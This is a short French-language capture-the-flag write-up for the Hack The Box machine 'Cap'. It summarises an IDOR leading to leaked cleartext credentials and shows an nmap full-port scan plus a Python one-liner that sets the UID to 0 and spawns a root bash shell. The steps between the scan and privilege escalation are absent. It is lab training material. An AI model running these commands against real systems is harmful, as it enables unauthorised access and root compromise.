# Cap

![image.png](image.png)

### **À propos**

Cap est une machine Linux de difficulté facile exécutant un serveur HTTP et effectuant des tâches d'administration, notamment la capture de trafic réseau. Des contrôles inadéquats peuvent entraîner une vulnérabilité IDOR (Insecure Direct Object Reference) permettant d'accéder à la capture d'un autre utilisateur. Cette capture contient des identifiants en clair et peut être utilisée pour obtenir un accès non autorisé au système. Une faille de sécurité Linux est ensuite exploitée pour obtenir les privilèges root.

Commençons par exporté l’IP de la la cible.

```jsx

└─$ export target=10.129.29.81
```

# Enumeration

## Nmap

Effectuons un scan complet de tous les ports TCP sur la cible sans ping préalable, en mode verbeux et rapide pour identifier les services exposés.

```jsx
┌──(hackthus💀kali)-[~/Workspace/Hackthebox/Cap]
└─$ sudo nmap -Pn -p- -v $target -T4
```

## Elévation de privileges

Lance Python 3.8 pour exécuter un one-liner qui **passe l’UID à 0 (root)** avec `os.setuid(0)` puis **ouvre un shell Bash** (`/bin/bash`) avec ces privilèges.

```jsx
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
